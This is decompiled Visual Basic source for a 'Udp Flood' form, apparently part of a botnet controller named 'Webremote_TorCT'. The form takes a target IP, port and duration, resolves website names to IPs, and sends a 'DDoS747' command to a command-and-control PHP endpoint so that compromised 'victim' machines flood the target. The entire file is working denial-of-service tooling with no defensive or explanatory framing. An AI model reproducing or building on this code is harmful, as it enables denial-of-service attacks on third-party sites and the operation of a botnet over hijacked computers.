Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class UdpForum
        Inherits Form
        ' Methods
        Public Sub New()
            Dim list As List(Of WeakReference) = UdpForum.__ENCList
            SyncLock list
                UdpForum.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.SendCommand = New WebClient
            Me.dos = ""
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (((Me.TextBox1.Text = "") Or (Me.TextBox2.Text = "")) Or (Me.TextBox3.Text = "")) Then
                Interaction.MsgBox("Please fill in all the fields!", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf (Conversions.ToDouble(Me.TextBox3.Text) > 120000) Then
                Interaction.MsgBox("The time can't be more than 120000 Milliseconds (2 Minutes)", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf (Versioned.IsNumeric(Me.TextBox2.Text) And Versioned.IsNumeric(Me.TextBox3.Text)) Then
                Me.dos = String.Concat(New String() { Me.TextBox1.Text, ":-:", Me.TextBox2.Text, ":-:", Me.TextBox3.Text })
                Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=DDoS747:" & Me.dos.ToString & MyProject.Forms.Client.Strvictem.ToString))
                Interaction.MsgBox("Sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                Me.Close
            Else
                Interaction.MsgBox("The Fields arn't correct!", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim str As String = ""
            str = Interaction.InputBox("Typin a website to get the ip. Like this : Expample.com" & ChrW(13) & ChrW(10) & "No 'HTTP://' or 'www.'", "Website URL", "", -1, -1)
            If str.ToString.Contains("www.") Then
                Interaction.MsgBox("Please Don't use 'Www.' & 'Http://'", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf str.ToString.Contains("://") Then
                Interaction.MsgBox("Please Don't use 'Www.' & 'Http://'", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf str.ToString.Contains("Www.") Then
                Interaction.MsgBox("Please Don't use 'Www.' & 'Http://'", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf str.ToString.Contains("WWw.") Then
                Interaction.MsgBox("Please Don't use 'Www.' & 'Http://'", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf str.ToString.Contains("WWW.") Then
                Interaction.MsgBox("Please Don't use 'Www.' & 'Http://'", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf str.ToString.Contains(".") Then
                Try 
                    Dim addressList As IPAddress() = Dns.GetHostEntry(str.ToString).AddressList
                    Interaction.MsgBox(("The ip of the website is :  " & addressList(0).ToString), MsgBoxStyle.ApplicationModal, Nothing)
                    Me.TextBox1.Text = addressList(0).ToString
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Interaction.MsgBox("Website not found!", MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            Else
                Interaction.MsgBox("Url Example : sitetodos.com ", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(UdpForum))
            Me.Button1 = New Button
            Me.Panel1 = New Panel
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.TextBox3 = New TextBox
            Me.Label1 = New Label
            Me.Label2 = New Label
            Me.Label3 = New Label
            Me.Button2 = New Button
            Me.SuspendLayout
            Dim point As New Point(&HC4, &H166)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            Dim size As New Size(100, &H17)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 0
            Me.Button1.Text = "Start (D)DoS"
            Me.Button1.UseVisualStyleBackColor = True
            Me.Panel1.BackgroundImage = DirectCast(manager.GetObject("Panel1.BackgroundImage"), Image)
            Me.Panel1.BackgroundImageLayout = ImageLayout.Zoom
            point = New Point(0, 0)
            Me.Panel1.Location = point
            Me.Panel1.Name = "Panel1"
            size = New Size(&H1EB, &H102)
            Me.Panel1.Size = size
            Me.Panel1.TabIndex = 1
            point = New Point(&HC4, &H11B)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(100, 20)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 2
            point = New Point(&HC4, &H132)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(100, 20)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 3
            Me.TextBox2.Text = "80"
            point = New Point(&HC4, &H14C)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(100, 20)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 4
            Me.Label1.AutoSize = True
            point = New Point(&H85, &H11B)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H37, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 5
            Me.Label1.Text = "Host (ip) : "
            Me.Label2.AutoSize = True
            point = New Point(&H85, &H135)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H23, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 6
            Me.Label2.Text = "Port : "
            Me.Label3.AutoSize = True
            point = New Point(&H85, &H14F)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H39, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 7
            Me.Label3.Text = "Time (m/s)"
            point = New Point(&H12E, &H119)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(40, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 8
            Me.Button2.Text = "...."
            Me.Button2.UseVisualStyleBackColor = True
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H1E8, &H189)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.TextBox3)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Panel1)
            Me.Controls.Add(Me.Button1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "UdpForum"
            Me.Text = "Udp Flood"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub TextBox2_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = WithEventsValue
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel1 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox2_TextChanged)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.TextChanged, handler
                End If
                Me._TextBox2 = WithEventsValue
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox3 = WithEventsValue
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("Panel1")> _
        Private _Panel1 As Panel
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        Private components As IContainer
        Private dos As String
        Private SendCommand As WebClient
    End Class
End Namespace

